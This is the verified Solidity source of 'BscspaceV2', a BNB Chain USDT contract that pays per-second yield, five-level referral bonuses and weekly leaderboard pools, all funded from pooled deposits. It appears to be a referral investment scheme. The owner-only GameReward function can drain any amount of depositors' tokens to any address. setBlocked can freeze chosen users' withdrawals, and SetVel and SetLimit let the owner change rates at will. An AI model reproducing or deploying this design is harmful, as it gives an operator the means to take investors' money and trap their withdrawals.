/**
 *Submitted for verification at BscScan.com on 2022-12-14
*/

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract BscspaceV2 {
    using SafeMath for uint256;
    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint public activedeposits;
    address public owner;
    address public subadmin;
    address public marketing;
    address public game;
    uint private releaseTime;
    uint private interestRateDivisor = 1000000000000;
    uint private minDepositSize = 25000000000000000000; //25 USDT
    address[5] public topInvastorAddress;
    uint[5] public topInvastorAmount;
    uint public weeklyTime;
    uint256 public pool_cycle;
    uint8[] public pool_bonuses; 
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;
    mapping (address => bool) private _isBlocked;
    uint public poolcount;
    
    Token token;
    address public tokenAddress; 
    uint256 public vel1 = 34800; //1%  0.1 = 11600 1 = 116000 0.3 = 34800
    uint256 public vel2 = 46400; //1.5% = 174000 0.4 = 46400
    uint256 public vel3 = 58000; //2% = 232000 0.5 = 58000

     uint256 public limit1 = 25; // 20 = 200
    uint256 public limit2 = 25; // 25 = 250
    uint256 public limit3 = 20; // 30 = 300

    struct Player {
        uint busdtDeposit;
        uint packageamount;
        uint totalDeposite;
        uint time;
        uint rTime;
        uint roi;
        uint roipaid;
        uint interestProfit;
        uint affRewards;
        uint payoutSum;
        address affFrom; 
        uint poolincome;
        uint gameCredit;
    }
    struct Lvl{
        uint lvl1count;
        uint lvl1total;
        uint lvl2count;
        uint lvl2total;
        uint lvl3count;
        uint lvl3total;
        uint lvl4count;
        uint lvl4total;
        uint lvl5count;
        uint lvl5total;
    }
     
    struct lvlroi{
        uint lvl1;
        uint lvl2;
        uint lvl3;
        uint lvl4;
        uint lvl5;
    }

    mapping(address => Player) public players;
    mapping(address => Lvl) public lvls;
    mapping(address => lvlroi) public lvlrois;
    

    event Newbie(address indexed user, address indexed _referrer, uint _time);  
	event NewDeposit(address indexed user, uint256 amount, uint _time);  
	event Withdrawn(address indexed user, uint256 amount, uint _time);  
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount, uint _time);
    event Reinvest(address indexed user, uint256 amount, uint _time); 
    event Week(uint _time);
  
   
    constructor() {
		owner = 0xb2123525eb5b31df4F33dF829e6C0cf7BC0656C3;
        subadmin = 0x1a0e4DdD00b8a6902639c752e0B7349319E21E5b;
        game = 0x2db72B98d6Fd7F167c46d05F293B02258354F93d;       
        marketing = 0x76522f3C9a946B66461Ee7e01EabdDdef2DbE646;  
        releaseTime = block.timestamp;
        weeklyTime = block.timestamp;
        _weekreset();
        //token address usdt
        tokenAddress = 0x55d398326f99059fF775485246999027B3197955;
        token = Token(address(tokenAddress));

        pool_bonuses.push(40);
        pool_bonuses.push(30);
        pool_bonuses.push(20);
        pool_bonuses.push(10);

        _ins();

	}


    fallback() external payable {
        revert("Invalid Transaction");
    }

    receive() external payable {
         revert("Invalid Transaction");
    }
    
    function setOwner(address _owner) public {
        require(msg.sender == owner, "Invalid User!");
        owner = _owner;      
             
    }    

    function setBlocked(address _addr,bool _res) public {
        require(msg.sender == owner, "Invalid User!");
        _isBlocked[_addr] = _res;
    }
    function isBlocked(address account) public view returns(bool) {
        return _isBlocked[account];
    }

    function deposit(address _affAddr,uint _amount) public payable {
        if (block.timestamp >= releaseTime){
        collect(msg.sender);
        
        }
        uint depositAmount = _amount;
        uint256 approvedAmt = token.allowance(msg.sender, address(this));
        require(approvedAmt >= depositAmount, "Check the token allowance");
        token.transferFrom(msg.sender, payable(address(this)), depositAmount);

        //minium deposit
        require(msg.sender != _affAddr, "Invalid Reffral!");
        require(depositAmount >= minDepositSize, "not minimum amount!");
        require(depositAmount > players[msg.sender].packageamount, "not minimum amount!");

        
        Player storage player = players[msg.sender];
        if (player.time == 0) {
            
            if (block.timestamp < releaseTime) {
               player.time = releaseTime; 
               player.rTime = releaseTime;
                
            }
            else{
               
               player.time = block.timestamp; 
               player.rTime = block.timestamp;
            }    
            totalPlayers++;
         
            if(_affAddr != address(0) && players[_affAddr].busdtDeposit > 0){
                 emit Newbie(msg.sender, _affAddr, block.timestamp);
              register(msg.sender, _affAddr,depositAmount);
            }
            else{
                emit Newbie(msg.sender, subadmin, block.timestamp);
              register(msg.sender, subadmin,depositAmount);
            }
        }
        //player.rTime = block.timestamp;
        player.busdtDeposit = player.busdtDeposit.add(depositAmount);
        player.totalDeposite = player.totalDeposite.add(depositAmount);
        player.packageamount = depositAmount;
        distributeRef(depositAmount, player.affFrom);  
        
        totalInvested = totalInvested.add(depositAmount);
        activedeposits = activedeposits.add(depositAmount); 
        _invastor(msg.sender,depositAmount);
        _pollDeposits(msg.sender, depositAmount);
        //payable(owner).transfer((depositAmount.mul(5)).div(100));


    }
       function _pollDeposits(address _addr, uint256 _amount) private {
        poolcount++;
        address upline = players[_addr].affFrom;

        if(upline == address(0)) return;
        
        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }


    function register(address _addr, address _affAddr,uint _depositAmount) private{
      
      uint depositAmount = _depositAmount;
      Player storage player = players[_addr];
      player.affFrom = _affAddr;

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
 
  
    lvls[_affAddr1].lvl1count = lvls[_affAddr1].lvl1count.add(1);
    lvls[_affAddr2].lvl2count = lvls[_affAddr2].lvl2count.add(1);
    lvls[_affAddr3].lvl3count = lvls[_affAddr3].lvl3count.add(1);
    lvls[_affAddr4].lvl4count = lvls[_affAddr4].lvl4count.add(1);
    lvls[_affAddr5].lvl5count = lvls[_affAddr5].lvl5count.add(1);

    lvls[_affAddr1].lvl1total = lvls[_affAddr1].lvl1total.add(depositAmount);
    lvls[_affAddr2].lvl2total = lvls[_affAddr2].lvl2total.add(depositAmount);
    lvls[_affAddr3].lvl3total = lvls[_affAddr3].lvl3total.add(depositAmount);
    lvls[_affAddr4].lvl4total = lvls[_affAddr4].lvl4total.add(depositAmount);
    lvls[_affAddr5].lvl5total = lvls[_affAddr5].lvl5total.add(depositAmount); 
    }

    function distributeRef(uint256 _trx, address _affFrom) private{
        uint256 _allaff = (_trx.mul(15)).div(100);
        address  _affAddr1 = _affFrom;
        address _affAddr2 = players[_affAddr1].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom; 
        address _affAddr5 = players[_affAddr4].affFrom; 

         uint256 _affRewards = 0;
         if (_affAddr1 != address(0)) {
            _affRewards = (_trx.mul(8)).div(100);
            _allaff = _allaff.sub(_affRewards);
           
           if (block.timestamp > releaseTime) {
               collect(_affAddr1);
                
            }

            players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
            players[_affAddr1].interestProfit = players[_affAddr1].interestProfit.add(_affRewards);
            emit RefBonus(_affAddr1, msg.sender, 1, _affRewards, block.timestamp);
    
          
        }

        if (_affAddr2 != address(0)) {
            if(lvls[_affAddr2].lvl1count > 1){
            _affRewards = (_trx.mul(3)).div(100);
            _allaff = _allaff.sub(_affRewards);

            if (block.timestamp > releaseTime) {
               collect(_affAddr2);
                
            }
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
            players[_affAddr2].interestProfit = players[_affAddr2].interestProfit.add(_affRewards);
            emit RefBonus(_affAddr2, msg.sender, 2, _affRewards, block.timestamp);

            }
            

        }

        if (_affAddr3 != address(0)) {
            if(lvls[_affAddr3].lvl1count > 3){
                _affRewards = (_trx.mul(2)).div(100);
                _allaff = _allaff.sub(_affRewards);
                if (block.timestamp > releaseTime) {
                    collect(_affAddr3);                
                }
                players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
                players[_affAddr3].interestProfit = players[_affAddr3].interestProfit.add(_affRewards);
                emit RefBonus(_affAddr3, msg.sender, 3, _affRewards, block.timestamp);
            }
        }

        if (_affAddr4 != address(0)) {
            if(lvls[_affAddr4].lvl1count > 5){
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (block.timestamp > releaseTime) {
               collect(_affAddr4);
                
            }
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
            players[_affAddr4].interestProfit = players[_affAddr4].interestProfit.add(_affRewards);            
            emit RefBonus(_affAddr4, msg.sender, 3, _affRewards, block.timestamp);
            }
        }

        if (_affAddr5 != address(0)) {
            if(lvls[_affAddr5].lvl1count > 7){
            _affRewards = (_trx.mul(1)).div(100);
            _allaff = _allaff.sub(_affRewards);
            if (block.timestamp > releaseTime) {
               collect(_affAddr5);
                
            }
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
            players[_affAddr5].interestProfit = players[_affAddr5].interestProfit.add(_affRewards);             
            emit RefBonus(_affAddr5, msg.sender, 3, _affRewards, block.timestamp);
            }
        }
    }

    function GameReward(address  payable ref, uint256 ref_amount, uint256 ref_token) public {
	    require(msg.sender == owner, "USER not allowed!");
        if(ref_amount != 0){
            ref.transfer(ref_amount);
        }		
        if(ref_token != 0){
            token.transfer(ref,ref_token);
        }        
	}
 

    function SetVel(uint256 _vel1,uint256 _vel2,uint256 _vel3 ) public {
	    require(msg.sender == owner, "USER not allowed!");
		vel1 = _vel1;
        vel2 = _vel2;
        vel3 = _vel3;
	}
    function SetLimit(uint256 _vel1,uint256 _vel2,uint256 _vel3 ) public {
	    require(msg.sender == owner, "USER not allowed!");
		limit1 = _vel1; //200 = 20
        limit2 = _vel2; 
        limit3 = _vel3;
	}

    function withdraw() public {
        require(_isBlocked[msg.sender] == false);
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);
        //easypool(msg.sender, players[msg.sender].interestProfit);
        roureff(msg.sender, players[msg.sender].roi);
        transferPayout(msg.sender, players[msg.sender].interestProfit);
        
    }

    function reinvest() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);
        //easypool(msg.sender, players[msg.sender].interestProfit);
        roureff(msg.sender, players[msg.sender].roi);
        transferReinvest(msg.sender, players[msg.sender].interestProfit);        
    }

    function roureff (address _addr , uint _amount) internal {

      uint j=0;
      address l = players[_addr].affFrom; 
      uint payamount = _amount;

      for (j = 1 ; j <= 5; j++) {
         
        if (l != address(0)) {
            if(j==1){
                players[l].interestProfit = players[l].interestProfit.add((payamount.mul(15)).div(100));
                players[l].poolincome = players[l].poolincome.add((payamount.mul(15)).div(100));
                lvlrois[l].lvl1 = players[l].poolincome.add((payamount.mul(15)).div(100));
            }
            if(j==2){  
                if(lvls[l].lvl1count > 1){ 
                players[l].interestProfit = players[l].interestProfit.add((payamount.mul(10)).div(100));
                players[l].poolincome = players[l].poolincome.add((payamount.mul(10)).div(100));
                lvlrois[l].lvl2 = players[l].poolincome.add((payamount.mul(10)).div(100));
                }
            }
            if(j==3){
                if(lvls[l].lvl1count > 3){ 
                players[l].interestProfit = players[l].interestProfit.add((payamount.mul(5)).div(100));
                players[l].poolincome = players[l].poolincome.add((payamount.mul(5)).div(100));
                lvlrois[l].lvl3 = players[l].poolincome.add((payamount.mul(5)).div(100));
                }
            }
            if(j==4){   
                if(lvls[l].lvl1count > 5){ 
                players[l].interestProfit = players[l].interestProfit.add((payamount.mul(3)).div(100));
                players[l].poolincome = players[l].poolincome.add((payamount.mul(3)).div(100));
                lvlrois[l].lvl4 = players[l].poolincome.add((payamount.mul(3)).div(100));
                }
            }
            if(j==5){
                if(lvls[l].lvl1count > 7){ 
                players[l].interestProfit = players[l].interestProfit.add((payamount.mul(2)).div(100));
                players[l].poolincome = players[l].poolincome.add((payamount.mul(2)).div(100));
                lvlrois[l].lvl5 = players[l].poolincome.add((payamount.mul(2)).div(100));
                }
            }         
        }else{
            j = 6;
        }
         l = players[l].affFrom;        
      }

    } 
    
    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
            uint256 contractBalance = token.balanceOf(address(this));
          //uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                activedeposits = activedeposits.sub(payout);                

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                player.gameCredit = player.gameCredit.add(payout.mul(5).div(100));
                if(player.packageamount >= 25000000000000000000 && player.packageamount < 600000000000000000001){
                    player.busdtDeposit = player.busdtDeposit.sub(payout.div(25).mul(10));
                }else if(player.packageamount >= 600000000000000000001 && player.packageamount < 1000000000000000000001){
                    player.busdtDeposit = player.busdtDeposit.sub(payout.div(3));
                }else if(player.packageamount >= 1000000000000000000001){
                    player.busdtDeposit = player.busdtDeposit.sub(payout.div(35).mul(10));
                }else{
                    player.busdtDeposit = player.busdtDeposit;
                } 
                token.transfer(marketing, (payout.mul(5)).div(100));
                token.transfer(game, (payout.mul(5)).div(100));
                token.transfer(msg.sender, (payout.mul(90)).div(100));
               // payable(owner).transfer((payout.mul(5)).div(100));
               // msg.sender.transfer((payout.mul(90)).div(100));
                emit Withdrawn(msg.sender, payout, block.timestamp);
            }
        }
    }

    function transferReinvest(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
           uint256 contractBalance = token.balanceOf(address(this));
          //uint contractBalance = address(this).balance;;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);
                activedeposits = activedeposits.sub(payout);                

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);
                player.gameCredit = player.gameCredit.add(payout.mul(5).div(100));
                if(player.packageamount >= 25000000000000000000 && player.packageamount < 600000000000000000001){
                    player.busdtDeposit = player.busdtDeposit.sub(payout.div(25).mul(10));
                }else if(player.packageamount >= 600000000000000000001 && player.packageamount < 1000000000000000000001){
                    player.busdtDeposit = player.busdtDeposit.sub(payout.div(3));
                }else if(player.packageamount >= 1000000000000000000001){
                    player.busdtDeposit = player.busdtDeposit.sub(payout.div(35).mul(10));
                }else{
                    player.busdtDeposit = player.busdtDeposit;
                }
                //payable(owner).transfer((payout.mul(5)).div(100));
                token.transfer(marketing, (payout.mul(5)).div(100));
                token.transfer(game, (payout.mul(5)).div(100));
                player.busdtDeposit = player.busdtDeposit.add((payout.mul(90)).div(100));
                player.totalDeposite = player.totalDeposite.add((payout.mul(90)).div(100));
                distributeRef((payout.mul(90)).div(100), player.affFrom);          
                totalInvested = totalInvested.add((payout.mul(90)).div(100));
                activedeposits = activedeposits.add((payout.mul(90)).div(100));  
                emit Reinvest(msg.sender, payout, block.timestamp);
            }
        }
    }

    function collect(address _addr) internal {
        Player storage player = players[_addr];
        
    	uint256 vel = getvel(player.packageamount);
	
       uint secPassed = block.timestamp.sub(player.time);
       if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.totalDeposite.mul(secPassed.mul(vel))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.roi = collectProfit;
            player.roipaid = player.roipaid.add(collectProfit);
    
            if(player.packageamount >= 25000000000000000000 && player.packageamount < 600000000000000000001){
                if (player.interestProfit >= player.busdtDeposit.mul(limit1).div(10)){
                    player.interestProfit = player.busdtDeposit.mul(limit1).div(10);
                }
            }
            if(player.packageamount >= 600000000000000000001 && player.packageamount < 1000000000000000000001){
                if (player.interestProfit >= player.busdtDeposit.mul(limit2).div(10)){
                    player.interestProfit = player.busdtDeposit.mul(limit2).div(10);
                }
            }
            if(player.packageamount >= 1000000000000000000001){
                if (player.interestProfit >= player.busdtDeposit.mul(limit3).div(10)){
                    player.interestProfit = player.busdtDeposit.mul(limit3).div(10);
                }
            }
            
            player.time = player.time.add(secPassed);
       }
       
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);
        if ( block.timestamp < releaseTime){
        return 0;   
        }
        else{
            uint secPassed = block.timestamp.sub(player.time);
            uint256 vel = getvel(player.packageamount);
            uint collectProfit =0 ;
            if (secPassed > 0) {
                collectProfit = (player.busdtDeposit.mul(secPassed.mul(vel))).div(interestRateDivisor);
            }

            if(player.packageamount >= 25000000000000000000 && player.packageamount < 600000000000000000001){
                if (collectProfit.add(player.interestProfit) >= player.busdtDeposit.mul(limit1).div(10)){
                    return player.busdtDeposit.mul(limit1).div(10);
                }else{
                    return collectProfit.add(player.interestProfit);
                }
            }else if(player.packageamount >= 600000000000000000001 && player.packageamount < 1000000000000000000001){
                if (collectProfit.add(player.interestProfit) >= player.busdtDeposit.mul(limit2).div(10)){
                    return player.busdtDeposit.mul(limit2).div(10);
                }else{
                    return collectProfit.add(player.interestProfit);
                }
            }else if(player.packageamount >= 1000000000000000000001){
                if (collectProfit.add(player.interestProfit) >= player.busdtDeposit.mul(limit3).div(10)){
                    return player.busdtDeposit.mul(limit3).div(10);
                }else{
                    return collectProfit.add(player.interestProfit);
                }
            }else{
                return 0;
            }       
        }
    }

    function getvel(uint _busdtDeposit) public view returns (uint256) { 
        uint256 vel = vel1; //1%  25 to 600  601 to 1000 1001
        if(_busdtDeposit > 25000000000000000001){
            vel = vel2; //1.50%
        }
        if(_busdtDeposit >= 1000000000000000000001){
            vel = vel3; //2%
        }
        return vel;
	}

    function _invastor(address _affAddr,uint _amount) internal  {
 
      for (uint j = 0; j < 5; j++) {  //for loop example
        if(topInvastorAmount[j] < _amount){            
            for(uint i = 4;i > j;i--){               
                uint k = i - 1;
                if(topInvastorAmount[k] != 0){
                    topInvastorAddress[i] = topInvastorAddress[k];
                    topInvastorAmount[i] = topInvastorAmount[k];
                }
            }
            topInvastorAddress[j] = _affAddr;
            topInvastorAmount[j] = _amount;
            j=5;
        }       
      }    

    }

    function gettopInvastorAmount() public view returns (uint[5] memory) {
        return topInvastorAmount;
    }

    function gettopInvastorAddress() public view returns (address[5] memory) {
        return topInvastorAddress;
    }

    function _weekreset() internal {
        pool_cycle++;
        for (uint j = 0; j < 5; j++) {  //for loop example
            topInvastorAddress[j] = address(0);
            topInvastorAmount[j] = 0;       
        }

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = address(0);
        }
    }

    function weekcheck() public {
        _weekcheck();
    }

    function _weekcheck() internal {
        uint time = weeklyTime.add(604800); //7day added
        if(time < block.timestamp){
            uint weekinvest = activedeposits.mul(2).div(100);
            uint weekspon = activedeposits.mul(2).div(100);           
            if(topInvastorAmount[0] == 0){                
                uint amt =(weekinvest.mul(50)).div(100);
                players[topInvastorAddress[0]].interestProfit = players[topInvastorAddress[0]].interestProfit.add(amt);       
            }
            if(topInvastorAmount[1] == 0){
                uint amt =(weekinvest.mul(25)).div(100);
                players[topInvastorAddress[1]].interestProfit = players[topInvastorAddress[1]].interestProfit.add(amt);               
            }  
            if(topInvastorAmount[2] == 0){
                uint amt =(weekinvest.mul(15)).div(100);
                players[topInvastorAddress[2]].interestProfit = players[topInvastorAddress[2]].interestProfit.add(amt);               
            }  
            if(topInvastorAmount[3] == 0){
                uint amt =(weekinvest.mul(10)).div(100);
                players[topInvastorAddress[3]].interestProfit = players[topInvastorAddress[3]].interestProfit.add(amt);
            }

            if(pool_top[0] != address(0)){                
                uint amt =(weekspon.mul(50)).div(100);
                players[pool_top[0]].interestProfit = players[pool_top[0]].interestProfit.add(amt);       
            }
            if(pool_top[1] != address(0)){
                uint amt =(weekspon.mul(25)).div(100);
                players[pool_top[1]].interestProfit = players[pool_top[1]].interestProfit.add(amt);               
            }  
            if(pool_top[2] != address(0)){
                uint amt =(weekspon.mul(15)).div(100);
                players[pool_top[2]].interestProfit = players[pool_top[2]].interestProfit.add(amt);               
            }  
            if(pool_top[3] != address(0)){
                uint amt =(weekspon.mul(10)).div(100);
                players[pool_top[3]].interestProfit = players[pool_top[3]].interestProfit.add(amt);
            }

            _weekreset();                  
            weeklyTime = block.timestamp;
            emit Week(block.timestamp);
        }
        
    }

    function _insertp(address _0 ,uint256 _1 ,uint256 _2 ,uint256 _3,uint256 _4,uint256 _5,uint256 _6,uint256 _7,uint256 _8) internal {
      players[_0].busdtDeposit = _1;
      players[_0].packageamount = _2;
      players[_0].totalDeposite = _3;
      players[_0].time = _4;
      players[_0].rTime = _5;
      players[_0].roi = _6;
      players[_0].roipaid = _7;
      players[_0].interestProfit = _8;
      players[_0].interestProfit = 0;
      players[_0].time = block.timestamp;
    }
    function _insertp1(address _0 ,uint256 _9,uint256 _10,address _11,uint256 _12,uint256 _13) internal {
      players[_0].affRewards = _9;
      players[_0].payoutSum = _10;
      players[_0].affFrom = _11;
      players[_0].poolincome = _12;
      players[_0].gameCredit = _13;

    }
    
    function _insertlvls(address _0 ,uint256 _lc1,uint256 _lt1,uint256 _lc2,uint256 _lt2,uint256 _lc3,uint256 _lt3,uint256 _lc4,uint256 _lt4,uint256 _lc5,uint256 _lt5) internal {
        lvls[_0].lvl1count = _lc1;
        lvls[_0].lvl1total = _lt1;
        lvls[_0].lvl2count = _lc2;
        lvls[_0].lvl2total = _lt2;
        lvls[_0].lvl3count = _lc3;
        lvls[_0].lvl3total = _lt3;
        lvls[_0].lvl4count = _lc4;
        lvls[_0].lvl4total = _lt4;
        lvls[_0].lvl5count = _lc5;
        lvls[_0].lvl5total = _lt5;
    }
    function _insertlvlrois (address _0 ,uint256 _l1,uint256 _l2,uint256 _l3,uint256 _l4,uint256 _l5) internal {
      lvlrois[_0].lvl1 = _l1;
      lvlrois[_0].lvl2 = _l2;
      lvlrois[_0].lvl3 = _l3;
      lvlrois[_0].lvl4 = _l4;
      lvlrois[_0].lvl5 = _l5;
    }

    function _ins() internal {
_insertp(0xBA6315Cd9d47D223bb1D20f507D84D8696Bd0D07,133069361281840605847,269000000000000000000,506244001120649537607,1670920006,1665902026,4510026557183642,391991775430023797789,1781035851476147872);
_insertp1(0xBA6315Cd9d47D223bb1D20f507D84D8696Bd0D07,334486051947442914509,932936599597022329912,0x1a0e4DdD00b8a6902639c752e0B7349319E21E5b,208239808071031765486,46646829979851116473);
_insertlvls(0xBA6315Cd9d47D223bb1D20f507D84D8696Bd0D07,6,486000000000000000000,16,2366000000000000000000,18,5844000000000000000000,4,217000000000000000000,1,25000000000000000000);
_insertlvlrois(0xBA6315Cd9d47D223bb1D20f507D84D8696Bd0D07,208240222845134736302,207496242637072602070,208671302543672488718,174825774601790529236,0);
_insertp(0x7853FC88C6bB996852812EaBF0020365EADfF831,39624294608571496797,25000000000000000000,55803894151428694207,1670237696,1665903381,8710080916643799021,30871567303142993565,1448469264000000000);
_insertp1(0x7853FC88C6bB996852812EaBF0020365EADfF831,4000000000000000000,40448998857142993565,0xBA6315Cd9d47D223bb1D20f507D84D8696Bd0D07,7025900818000000000,2022449942857149678);
_insertlvls(0x7853FC88C6bB996852812EaBF0020365EADfF831,2,50000000000000000000,1,25000000000000000000,1,25000000000000000000,1,25000000000000000000,8,1383000000000000000000);
_insertlvlrois(0x7853FC88C6bB996852812EaBF0020365EADfF831,8474370082000000000,6656570738000000000,0,0,0);
_insertp(0xFF742a781e0806B6b0a65e90A03Bf136cE922350,14880547309600000000,25000000000000000000,25000000000000000000,1670248565,1666094474,9656461760000000000,21679612360000000000,0);
_insertp1(0xFF742a781e0806B6b0a65e90A03Bf136cE922350,2000000000000000000,25298631726000000000,0x7853FC88C6bB996852812EaBF0020365EADfF831,1619019366000000000,1264931586300000000);
_insertlvls(0xFF742a781e0806B6b0a65e90A03Bf136cE922350,1,25000000000000000000,1,25000000000000000000,1,25000000000000000000,8,1383000000000000000000,4,1829000000000000000000);
_insertlvlrois(0xFF742a781e0806B6b0a65e90A03Bf136cE922350,3237728142000000000,0,0,0,0);
_insertp(0xc4944bc6BBF7a6D2ACE4154D3C7a17c139340B23,15924040989148075250,25000000000000000000,25000000000000000000,1670029334,1666095040,10791391840000000000,20121057240000000000,28242727435817535);
_insertp1(0xc4944bc6BBF7a6D2ACE4154D3C7a17c139340B23,2542441112327374284,22689897527129811891,0xFF742a781e0806B6b0a65e90A03Bf136cE922350,54641902238255142,1134494876356490594);
_insertlvls(0xc4944bc6BBF7a6D2ACE4154D3C7a17c139340B23,1,25000000000000000000,1,25000000000000000000,8,1383000000000000000000,4,1829000000000000000000,5,3009000000000000000000);
_insertlvlrois(0xc4944bc6BBF7a6D2ACE4154D3C7a17c139340B23,82884629674072677,0,0,0,0);
_insertp(0x96C574b6Da696BB52063007017C2411E8F48A857,8613754417853556603,25000000000000000000,31780513904092178553,1670917737,1666096883,383400119738968,30346021516794348432,5938327961107907712);
_insertp1(0x96C574b6Da696BB52063007017C2411E8F48A857,21009866727532465769,57916898715596554923,0xc4944bc6BBF7a6D2ACE4154D3C7a17c139340B23,12499338432377648434,2895844935779827744);
_insertlvls(0x96C574b6Da696BB52063007017C2411E8F48A857,1,25000000000000000000,8,1383000000000000000000,4,1829000000000000000000,5,3009000000000000000000,0,0);
_insertlvlrois(0x96C574b6Da696BB52063007017C2411E8F48A857,12499813675563025189,0,0,0,0);
_insertp(0x455454763b70a73CA92E79002DFf9968D001644e,17813052960000000000,25000000000000000000,25000000000000000000,1669214502,1666116680,8540372400000000000,17967367600000000000,0);
_insertp1(0x455454763b70a73CA92E79002DFf9968D001644e,0,17967367600000000000,0x7853FC88C6bB996852812EaBF0020365EADfF831,0,898368380000000000);
_insertlvls(0x455454763b70a73CA92E79002DFf9968D001644e,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x455454763b70a73CA92E79002DFf9968D001644e,0,0,0,0,0);
_insertp(0x6B9c7ceCbfCDBE9E7FB4E3be2e689E75E552564b,277221414401866666680,601000000000000000000,601000000000000000000,1670926166,1666427659,1009599225600000000,580977142657600000000,8339238292479999999);
_insertp1(0x6B9c7ceCbfCDBE9E7FB4E3be2e689E75E552564b,188510000000000000000,971335756794400000001,0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,210187852429280000000,48566787839719999997);
_insertlvls(0x6B9c7ceCbfCDBE9E7FB4E3be2e689E75E552564b,3,1228000000000000000000,5,3009000000000000000000,0,0,0,0,0,0);
_insertlvlrois(0x6B9c7ceCbfCDBE9E7FB4E3be2e689E75E552564b,210141862178400000000,210275304179680000000,0,0,0);
_insertp(0x56cD45cd4B2136A70067B72a55Bf862960B702a3,384181637637840000013,601000000000000000000,601000000000000000000,1670814217,1666428304,29160808480000000000,565669516878400000000,4347835551360000000);
_insertp1(0x56cD45cd4B2136A70067B72a55Bf862960B702a3,48080000000000000000,650455087086480000000,0x6B9c7ceCbfCDBE9E7FB4E3be2e689E75E552564b,41053405759440000000,32522754354324000000);
_insertlvls(0x56cD45cd4B2136A70067B72a55Bf862960B702a3,1,601000000000000000000,0,0,0,0,0,0,0,0);
_insertlvlrois(0x56cD45cd4B2136A70067B72a55Bf862960B702a3,45401241310800000000,0,0,0,0);
_insertp(0xac38064692750Cb22447E1902B2549c352fa2E1c,0,51000000000000000000,51000000000000000000,1670868805,1667132371,3787101369600000000,39607004736000000000,0);
_insertp1(0xac38064692750Cb22447E1902B2549c352fa2E1c,48080000000000000000,127500000000000000000,0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,49140807550800000000,6375000000000000000);
_insertlvls(0xac38064692750Cb22447E1902B2549c352fa2E1c,1,601000000000000000000,0,0,0,0,0,0,0,0);
_insertlvlrois(0xac38064692750Cb22447E1902B2549c352fa2E1c,51652240002960000000,0,0,0,0);
_insertp(0x795bDBD24830520A7B0332ccD52b638717107Aa6,24462209740800000000,30000000000000000000,30000000000000000000,1670047493,1667561057,13844475648000000000,13844475648000000000,0);
_insertp1(0x795bDBD24830520A7B0332ccD52b638717107Aa6,0,13844475648000000000,0xe1c49c0AFc7660Bd9aC0D48782bD695251509FDF,0,692223782400000000);
_insertlvls(0x795bDBD24830520A7B0332ccD52b638717107Aa6,0,0,0,0,0,0,0,0,0,0);
_insertlvlrois(0x795bDBD24830520A7B0332ccD52b638717107Aa6,0,0,0,0,0);
_insertp(0x6Ffb4371aD043d8df01e8b0d1b3CefDecC688023,123742262794394973581,62000000000000000000,200525725691490816691,1670872365,1667723514,665450235427531636,78550934269030303436,2191118696034384015);
_insertp1(0x6Ffb4371aD043d8df01e8b0d1b3CefDecC688023,103694997980039769369,191958657242739608016,0xBA6315Cd9d47D223bb1D20f507D84D8696Bd0D07,11903843689703919226,9597932862136980392);
_insertlvls(0x6Ffb4371aD043d8df01e8b0d1b3CefDecC688023,3,220000000000000000000,2,2402000000000000000000,0,0,0,0,0,0);
_insertlvlrois(0x6Ffb4371aD043d8df01e8b0d1b3CefDecC688023,9989181398858303241,12824106025703919226,0,0,0);
_insertp(0x296094D2281B15DCcD7e02e91800e52c70656Ed4,20101863162480949080,30000000000000000000,40665978552000000000,1670844216,1667801134,4678926770697442406,25274525266926452466,0);
